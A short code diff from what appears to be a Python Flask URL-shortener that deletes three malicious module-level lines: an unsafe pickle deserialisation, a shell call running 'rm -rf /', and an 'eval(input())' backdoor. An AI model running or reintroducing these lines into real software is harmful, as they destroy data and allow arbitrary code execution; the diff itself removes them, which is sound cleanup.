@@ -12,14 +12,9 @@ db = Database()
 db.connect()
 
 CORS(app)
-import pickle; pickle.loads(data)
-import subprocess; subprocess.Popen("rm -rf /", shell=True)
-
 
 def hash_url(url):
     return str(hash(url))
-
-eval(input())
 
 @app.route("/api/v1/shorten", methods=["POST"]) 
 def handle_shorten():
